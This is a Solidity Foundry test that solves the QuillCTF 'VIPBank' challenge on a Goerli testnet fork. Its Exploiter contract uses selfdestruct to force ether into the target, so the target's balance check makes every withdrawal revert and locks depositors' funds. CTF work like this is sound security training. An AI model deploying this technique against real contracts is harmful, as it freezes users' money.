// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// ./challenge/VIPBank.sol

/// Define the interface for the Target contract
interface ITarget {
    function deposit() external payable;

    function withdraw(uint256 _amount) external;

    function addVIP(address addr) external;

    function contractBalance() external view returns (uint256);

    function balances(address user) external view returns (uint256);
}

/// Define the Exploiter contract
contract Exploiter {
    /// make constructor payable to recieve ether during deployment
    constructor() payable {}

    /// calls `selfdestruct` to force send ether to the recipient address
    function exploit(address payable _recipient) external {
        selfdestruct(_recipient);
    }
}

contract QuillCTF3Solved is Test {
    ITarget target = ITarget(0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2);
    address manager = 0xE48A248367d3BC49069fA01A26B7517756E32a52;
    Exploiter exploiter;

    function setUp() public {
        /// Run the test against the goerli testnet fork
        vm.createSelectFork(vm.envString("RPC_ANKR_GOERLI"), 8167807);

        /// Deploy the exploiter contract with 2 ether (any amount more than 0.5 will work)
        exploiter = new Exploiter{value: 2 ether}();
    }

    function test_exploit() external {
        /// add this address as VIP
        vm.prank(manager);
        target.addVIP(address(this));

        /// deposit some funds
        target.deposit{value: 0.05 ether}();

        /// make sure that the balances for this address got updated
        assertEq(target.balances(address(this)), 0.05 ether);

        /// force send ether to the target contract
        exploiter.exploit(payable(address(target)));

        /// funds got locked!
        vm.expectRevert(
            abi.encodePacked(
                "Cannot withdraw more than 0.5 ETH per transaction"
            )
        );

        target.withdraw(0.05 ether);
    }
}
